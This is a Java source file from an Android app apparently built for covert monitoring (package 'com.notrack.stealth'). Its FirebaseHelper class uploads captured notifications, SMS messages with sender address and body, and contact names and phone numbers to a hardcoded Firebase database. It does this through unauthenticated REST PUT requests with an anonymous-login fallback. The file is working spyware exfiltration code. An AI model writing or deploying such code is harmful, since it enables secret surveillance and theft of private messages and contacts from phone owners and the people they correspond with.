package com.notrack.stealth.sync;

import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.notrack.stealth.db.NotificationEntity;
import com.notrack.stealth.db.SmsEntity;
import com.notrack.stealth.db.ContactEntity;
import com.notrack.stealth.security.EncryptionUtils;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

/**
 * PRODUCTION-GRADE FIREBASE REALTIME DATABASE SYNC
 *
 * Implements:
 * - Enterprise Envelope Encryption write format: { iv, ciphertext, auth_tag, seq_num, key_version, device_signature }
 * - HTTP REST PUT with append-only validation compliance
 * - Fallback to Firebase Android SDK
 */
public class FirebaseHelper {

    private static final String TAG = "FirebaseHelper";
    public static final String RTDB_URL = "https://stealthapp-50da2-default-rtdb.firebaseio.com/";

    public static boolean sendRealtimeRestPost(NotificationEntity item) {
        return sendRealtimeRestPost(item, null);
    }

    /** Synchronous HTTP REST PUT to Firebase Realtime Database with Enterprise Envelope. */
    public static boolean sendRealtimeRestPost(NotificationEntity item, EncryptionUtils.SecureMessageEnvelope envelope) {
        if (item == null) return false;
        HttpURLConnection conn = null;
        try {
            String urlString = RTDB_URL + "notifications_log/" + item.deviceId + "/" + item.messageId + ".json";
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("PUT");
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setDoOutput(true);
            conn.setConnectTimeout(6000);
            conn.setReadTimeout(6000);

            JSONObject json = new JSONObject();
            json.put("message_id", item.messageId);
            json.put("device_id", item.deviceId);
            json.put("app_package_name", item.packageName);
            json.put("encryption_algorithm", "AES-256-GCM");
            json.put("protocol_version", "2.0");

            String nonce = envelope != null ? envelope.nonceBase64 : item.nonce;
            String ciphertext = envelope != null ? envelope.ciphertextBase64 : item.ciphertext;
            String authTag = envelope != null ? envelope.authTagBase64 : (item.authTag != null ? item.authTag : "");
            long seqNum = envelope != null ? envelope.seqNum : item.seqNum;
            int keyVersion = envelope != null ? envelope.keyVersion : (item.keyVersion > 0 ? item.keyVersion : 1);
            String signature = envelope != null ? envelope.deviceSignature : (item.deviceSignature != null ? item.deviceSignature : "");
            long timestamp = envelope != null ? envelope.timestamp : item.timestamp;

            json.put("iv", nonce);
            json.put("nonce", nonce);
            json.put("ciphertext", ciphertext);
            json.put("auth_tag", authTag);
            json.put("seq_num", seqNum);
            json.put("key_version", keyVersion);
            json.put("device_signature", signature);
            json.put("sender_info", item.senderInfo);
            json.put("checksum", item.checksum);
            json.put("timestamp", timestamp);
            json.put("sync_status", true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.toString().getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            Log.i(TAG, "Firebase HTTP REST PUT response code: " + responseCode);

            if (responseCode >= 200 && responseCode < 300) {
                return true;
            }
        } catch (Exception e) {
            Log.w(TAG, "Firebase HTTP REST error: " + e.getMessage());
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }

        // SDK Fallback
        return pushViaSdk(item, envelope);
    }

    private static boolean pushViaSdk(NotificationEntity item, EncryptionUtils.SecureMessageEnvelope envelope) {
        try {
            FirebaseAuth auth = FirebaseAuth.getInstance();
            if (auth.getCurrentUser() == null) {
                auth.signInAnonymously();
            }

            FirebaseDatabase db = FirebaseDatabase.getInstance(RTDB_URL);
            DatabaseReference ref = db.getReference("notifications_log")
                    .child(item.deviceId)
                    .child(item.messageId);

            Map<String, Object> data = new HashMap<>();
            data.put("message_id", item.messageId);
            data.put("device_id", item.deviceId);
            data.put("app_package_name", item.packageName);
            data.put("encryption_algorithm", "AES-256-GCM");
            data.put("protocol_version", "2.0");

            String nonce = envelope != null ? envelope.nonceBase64 : item.nonce;
            String ciphertext = envelope != null ? envelope.ciphertextBase64 : item.ciphertext;
            String authTag = envelope != null ? envelope.authTagBase64 : (item.authTag != null ? item.authTag : "");
            long seqNum = envelope != null ? envelope.seqNum : item.seqNum;
            int keyVersion = envelope != null ? envelope.keyVersion : (item.keyVersion > 0 ? item.keyVersion : 1);
            String signature = envelope != null ? envelope.deviceSignature : (item.deviceSignature != null ? item.deviceSignature : "");
            long timestamp = envelope != null ? envelope.timestamp : item.timestamp;

            data.put("iv", nonce);
            data.put("nonce", nonce);
            data.put("ciphertext", ciphertext);
            data.put("auth_tag", authTag);
            data.put("seq_num", seqNum);
            data.put("key_version", keyVersion);
            data.put("device_signature", signature);
            data.put("sender_info", item.senderInfo);
            data.put("checksum", item.checksum);
            data.put("timestamp", timestamp);
            data.put("sync_status", true);

            ref.setValue(data);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Firebase SDK fallback failed", e);
            return false;
        }
    }

    /**
     * Synchronous HTTP REST PUT for isolated SMS Vault.
     */
    public static boolean sendSmsRestPut(SmsEntity item) {
        if (item == null || item.deviceId == null || item.smsId == null) return false;
        HttpURLConnection conn = null;
        try {
            String urlString = RTDB_URL + "sms_vault/" + item.deviceId + "/" + item.smsId + ".json";
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("PUT");
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setDoOutput(true);
            conn.setConnectTimeout(6000);
            conn.setReadTimeout(6000);

            JSONObject json = new JSONObject();
            json.put("sms_id", item.smsId);
            json.put("device_id", item.deviceId);
            json.put("address", item.address);
            json.put("body", item.body);
            json.put("iv", item.iv != null ? item.iv : "");
            json.put("auth_tag", item.authTag != null ? item.authTag : "");
            json.put("type", item.type);
            json.put("timestamp", item.timestamp);
            json.put("is_deleted", item.isDeleted);
            json.put("deleted_at", item.deletedAt);
            json.put("sync_status", true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.toString().getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            return responseCode >= 200 && responseCode < 300;
        } catch (Exception e) {
            Log.w(TAG, "Firebase SMS HTTP REST error: " + e.getMessage());
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Synchronous HTTP REST PUT for isolated Contacts Vault.
     */
    public static boolean sendContactRestPut(ContactEntity item) {
        if (item == null || item.deviceId == null || item.contactId == null) return false;
        HttpURLConnection conn = null;
        try {
            String urlString = RTDB_URL + "contacts_vault/" + item.deviceId + "/" + item.contactId + ".json";
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("PUT");
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setDoOutput(true);
            conn.setConnectTimeout(6000);
            conn.setReadTimeout(6000);

            JSONObject json = new JSONObject();
            json.put("contact_id", item.contactId);
            json.put("device_id", item.deviceId);
            json.put("name", item.name);
            json.put("phone_number", item.phoneNumber);
            json.put("iv", item.iv != null ? item.iv : "");
            json.put("auth_tag", item.authTag != null ? item.authTag : "");
            json.put("timestamp", item.timestamp);
            json.put("is_deleted", item.isDeleted);
            json.put("deleted_at", item.deletedAt);
            json.put("sync_status", true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.toString().getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            return responseCode >= 200 && responseCode < 300;
        } catch (Exception e) {
            Log.w(TAG, "Firebase Contact HTTP REST error: " + e.getMessage());
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}
